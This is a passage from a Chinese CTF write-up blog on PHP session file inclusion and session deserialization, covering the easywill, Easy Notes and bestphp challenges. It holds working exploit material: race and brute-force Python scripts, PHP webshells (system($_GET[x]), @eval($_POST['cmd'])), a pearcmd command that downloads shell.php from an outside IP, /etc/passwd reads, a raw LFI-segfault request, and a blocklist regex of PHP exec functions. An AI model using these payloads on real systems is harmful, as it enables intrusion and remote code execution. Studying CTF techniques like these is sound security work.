&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/?file=/tmp/sess_&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">clear&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Event&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="hxb-2021easywill">[HXB 2021]easywill&lt;/h3>
&lt;p>willphp v2.1.5，是基于tp的框架&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">home\controller&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">IndexController&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">assign&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;value&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">view&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>assign()可以控制name和value参数，而紧跟着的view函数有点东西&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101839993.png" alt="image-20211118101839993">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101952307.png" alt="image-20211118101952307">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102033617.png" alt="image-20211118102033617">&lt;/p>
&lt;p>可以看到最后的49行有文件写入的点，51行有个&lt;code>extract()&lt;/code>可以做到变量覆盖，那我们就把file_put_contents的参数换成自己想要的&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>可以正常回显&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102448850.png" alt="image-20211118102448850">&lt;/p>
&lt;p>不过flag文件的名字并不是flag，我们可以用pearcmd写shell的方法来个webshell（详细的可以参考我之前写过的另一个题-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/#give_me_you_0day">[强网拟态 2021]Give_me_your_0day&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/../../../../usr/local/lib/php/pearcmd.php&amp;amp;+install+-R+/tmp+http://101.35.114.107:2301/shell.php
&lt;/code>&lt;/pre>&lt;p>不过这里要注意shell的写法，常规的&lt;code>&amp;lt;?php eval($_POST['a']);?&amp;gt;&lt;/code>这样的是不行的，下载就会报错&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118103659930.png" alt="image-20211118103659930">&lt;/p>
&lt;p>执行也会报错，这里的shell要这样写&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php system(&amp;#34;ls /&amp;#34;);&amp;#39;&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118105922638.png" alt="image-20211118105922638">&lt;/p>
&lt;p>之后直接把value的值换成flag文件名即可&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/flag32897328937298hdwidh
&lt;/code>&lt;/pre>&lt;p>————不过这里我直接写🐎一直成功不了，只能远程包含🐎&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118110226581.png" alt="image-20211118110226581">&lt;/p>
&lt;p>————诶，说了半天，其实和本篇有关的在非预期的点，和上面的脚本几乎一样，要改的地方在于read部分的url了&lt;/p>
&lt;pre tabindex="0">&lt;code>?name=cfile&amp;amp;value=/tmp/sess_'+sessid
&lt;/code>&lt;/pre>&lt;h2 id="反序列化">反序列化&lt;/h2>
&lt;p>这里详细的讲解可以参照&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP中SESSION反序列化机制&lt;/a>，就不做复制粘贴工程师了，用自己的话讲几个里面已经提过的点吧&lt;/p>
&lt;p>首先，这里的问题（我们可以攻击的原因）出现在两种序列化引擎混用的情况下，当提交&lt;/p>
&lt;pre tabindex="0">&lt;code>?a=|O:8:&amp;quot;stdClass&amp;quot;:0:{}
&lt;/code>&lt;/pre>&lt;p>时，&lt;code>php_serialize&lt;/code>方式下会被存储为&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;quot;a&amp;quot;;s:20:&amp;quot;|O:8:&amp;quot;stdClass&amp;quot;:0:{}&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>但是被&lt;code>php&lt;/code>方式则会解析为&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;quot;a&amp;quot;;s:20:&amp;quot;=O:8:&amp;quot;stdClass&amp;quot;:0:{}&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>在具体应用时，可控的点除了get/post的参数之外，还可以接着构造文件上传的表单，除了&lt;code>PHPSESSID&lt;/code>之外的废物文件的文件名就可以当此大任，记得序列化字符前面要加上&lt;code>|&lt;/code>，内部的双引号要用&lt;code>\&lt;/code>进行转义&lt;/p>
&lt;h3 id="harekazectf2019easy-notes">[HarekazeCTF2019]Easy Notes&lt;/h3>
&lt;p>这个题得审&lt;a href="https://github.dev/TeamHarekaze/HarekazeCTF2019-challenges/tree/master/easy_notes/server/public">源码&lt;/a>&lt;/p>
&lt;p>有添加note 导出note的功能，但是却不是常见的xss（因为是php写的嘛），会检测session中的admin是不是true&lt;/p>
&lt;p>我们的突破口在导出.zip这个功能上&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203112810148.png" alt="image-20211203112810148">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203113735250.png" alt="image-20211203113735250">&lt;/p>
&lt;p>我们可以手动伪造一个session文件，之后将PHPSESSID设为生成的值即可，内容呢 就是admin=1&lt;/p>
&lt;pre tabindex="0">&lt;code>xxxx|N;admin|b:1;xxxxxx
&lt;/code>&lt;/pre>&lt;p>用&lt;code>xxxx|N;&lt;/code>闭合前面脏数据，编辑到title中，将session的PHPSESSID设置好就可以getflag了&lt;/p>
&lt;h3 id="xctf-final-2018bestphp">[XCTF final 2018]bestphp&lt;/h3>
&lt;p>&lt;a href="https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp">这里是docker环境&lt;/a>（注意设置暴露端口 另外首页的index.php的submit要改一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129171252486.png" alt="image-20211129171252486">&lt;/p>
&lt;p>这里有熟悉的&lt;code>call_user_func&lt;/code>，来读一下admin.php的源码&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=php://filter/convert.base64-encode/resource=admin.php
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">hello&lt;/span> &lt;span style="color:#75af00">admin&lt;/span>
&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75715e">#echo &amp;#39;hello &amp;#39; + $_SESSION[&amp;#39;name&amp;#39;];
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;you must login with admin&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再读一下function.php，但是好像这俩都没啥用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filters&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/eval|assert|exec|passthru|glob|system|popen/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Do not hack me!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>很显然我们需要利用session包含，但是index.php中设置了open_basedir，默认的session路径是&lt;code>/var/lib/php/sessions/sess_phpsessid&lt;/code>，不过有个方式可以更改session存储目录&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172602323.png" alt="image-20211129172602323">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172609578.png" alt="image-20211129172609578">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172619585.png" alt="image-20211129172619585">&lt;/p>
&lt;p>那我们就可以把shell写到web根目录下&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=session_start&amp;amp;save_path=.
POST: name=&amp;lt;?php echo &amp;quot;aaa&amp;quot;;system($_GET[x]);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>一般的一句话会没法正常工作（之前湖湘杯willphp也是这样，那个是&lt;code>&amp;lt;?php echo '&amp;lt;?php system(&amp;quot;ls /&amp;quot;);'?&amp;gt;&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=ls
?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=cat+fsadgsdagsadgasd.php
&lt;/code>&lt;/pre>&lt;p>拿到flag&lt;/p>
&lt;h4 id="解法2php70---lfi-via-segmentfault">解法2：php7.0 - LFI via SegmentFault&lt;/h4>
&lt;p>参考：&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>&lt;code>string.strip_tags&lt;/code>可以导致php在执行过程中Segment Fault&lt;/p>
&lt;p>如果请求中同时存在一个上传文件的请求，这个文件会被保留，存储在/tmp/phpxxxxxxxxxxx（xxxxx是数字+字母的6位数），这个文件连续保存，不用竞争直接爆破（多线程上传文件，生成多个phpxxxxxxxxxxx）&lt;/p>
&lt;p>利用exp（打出来502是正常情况&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/index.php?function=extract&amp;amp;file=php://filter/string.strip_tags/resource=function.php&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">101.35.114.107:20004&lt;/span>
&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1701&lt;/span>
&lt;span style="color:#111">Cache-Control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">max-age=0&lt;/span>
&lt;span style="color:#111">Origin&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">null&lt;/span>
&lt;span style="color:#111">Upgrade-Insecure-Requests&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">DNT&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk&lt;/span>
&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&lt;/span>
&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&lt;/span>
&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7&lt;/span>
&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=17qpuv1r8g19pm503593nddq10&lt;/span>
&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
------WebKitFormBoundaryeScXqSzdW2v22xyk
Content-Disposition: form-data; name=&amp;#34;fileUpload&amp;#34;; filename=&amp;#34;test.jpg&amp;#34;
Content-Type: image/jpeg
&amp;lt;?php echo &amp;#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&amp;#34;;@eval($_POST[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
------WebKitFormBoundaryeScXqSzdW2v22xyk--
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上帝视角看的话是这样&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129183250382.png" alt="image-20211129183250382">&lt;/p>
&lt;p>用py脚本爆破出来(py2)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">letters&lt;/span>
&lt;span style="color:#111">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;10.99.99.16&amp;#34;&lt;/span>
&lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>
&lt;span style="color:#111">base_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">/index.php?function=extract&amp;amp;file=/tmp/php&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">base_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">url&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
